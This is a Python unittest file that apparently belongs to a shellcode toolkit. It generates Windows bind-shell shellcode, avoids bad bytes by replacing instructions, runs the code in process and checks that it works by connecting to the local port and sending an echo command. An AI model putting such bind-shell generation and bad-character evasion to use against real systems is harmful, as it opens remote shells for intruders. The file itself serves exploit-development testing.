import random
import socket
import time
import unittest

import stones
from coder import bind_shell
from runner import load_shellcode, run_shellcode


def test_bind_shell_shellcode(shellcode, port):
    ptr = load_shellcode(shellcode)
    run_shellcode(ptr, wait=False)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(("127.0.0.1", port))

        s.send(b"echo p^w^n^e^d\r\n")
        time.sleep(0.5)

        resp = s.recv(0x1000)
        s.send(b"exit\r\n")

    return b"pwned" in resp


class TestBindShell(unittest.TestCase):
    def test_run_shellcode(self):
        port = random.randint(49152, 65535)
        bad_chars = b"\x00"

        code = bind_shell.generate(
            port,
            bad_chars=bad_chars,
            exit_func=("ntdll.dll", "RtlExitUserThread"),
            debug=False,
        )
        shellcode = stones.assemble(code)
        self.assertFalse(any(c in bad_chars for c in shellcode))

        self.assertTrue(test_bind_shell_shellcode(shellcode, port))

    def test_run_replaced_shellcode(self):
        port = random.randint(49152, 65535)
        bad_chars = b"\x00\x08\x09\x18\x19\x1C\x1F\x20\x30"

        code = bind_shell.generate(
            port,
            bad_chars=bad_chars,
            exit_func=("ntdll.dll", "RtlExitUserThread"),
            debug=False,
        )
        replaced_code = stones.replace_instructions(code, bad_chars)
        shellcode = stones.assemble(replaced_code)
        self.assertFalse(any(c in bad_chars for c in shellcode))

        self.assertTrue(test_bind_shell_shellcode(shellcode, port))
